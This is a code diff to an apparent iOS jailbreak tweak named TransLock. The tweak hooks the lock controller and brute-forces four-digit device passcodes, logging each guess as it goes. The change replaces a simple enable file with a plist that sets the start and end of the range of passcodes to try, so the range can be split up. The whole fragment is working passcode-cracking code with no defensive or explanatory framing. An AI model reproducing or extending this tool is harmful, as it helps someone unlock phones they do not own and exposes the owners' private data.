@@ -1,9 +1,4 @@
-#include <unistd.h>
-#define CONTROL_FILE "/var/mobile/Documents/translock.enable"
-
-bool is_disabled() {
-	return access(CONTROL_FILE, R_OK);
-}
+#define CONTROL_FILE @"/var/mobile/Documents/translock.plist"
 
 @interface SBDeviceLockController
 + (id)sharedController;
@@ -36,11 +31,17 @@ NSString *numString;
 
 - (void)bruteforce {
 	NSLog(@"bruteforce start");
-	if (is_disabled()) {
-		NSLog(@"TransLock disabled");
+	NSMutableDictionary *prefs = [[NSMutableDictionary alloc] initWithContentsOfFile:CONTROL_FILE];
+	if (!prefs) {
+		NSLog(@"no control, disabled");
 		return;
 	}
-	for (int i = 0; i <= 9999; i++)
+	int start = [prefs["start"] intValue];
+	int end = [prefs["end"] intValue];
+
+	NSLog(@"start = %d, end = %d", start, end);
+
+	for (int i = start; i <= end; i++)
 	{
 		numString = [NSString stringWithFormat:@"%04d", i];
 		NSLog(@"Testing : %@", numString);
